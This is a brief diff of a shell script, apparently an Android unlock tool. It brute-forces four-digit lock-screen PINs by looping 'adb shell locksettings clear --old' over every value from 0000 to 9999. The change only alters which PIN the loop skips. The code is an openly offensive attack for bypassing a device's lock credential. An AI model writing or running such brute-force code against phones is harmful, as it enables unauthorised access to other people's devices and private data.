@@ -148,7 +148,7 @@ android4() {
     echo -e "Bruteforce attack will be started within 2 seconds..\nPlease use (CTRL+C) to abort the attack at anytime.."
     printf "%52s\n" | tr ' ' '-'
     for i in {0000..9999}; do
-        if [[ $i != 1036 ]]; then
+        if [[ $i != 0000 ]]; then
             if [[ -z $(adb shell locksettings clear --old $i | grep "Lock credential cleared") ]]; then
                 printf "Wrong PIN: \e[1;31m$i\e[0m\n"
             else
@@ -213,7 +213,7 @@ android6() {
 
 
 androidgui4() {
-    if [[ $i != 1036 ]]; then
+    if [[ $i != 0000 ]]; then
         screen="$(adb shell dumpsys nfc | grep 'mScreenState=')"
         case $screen in
             "mScreenState=OFF") echo -e "Preparing to attack."; 
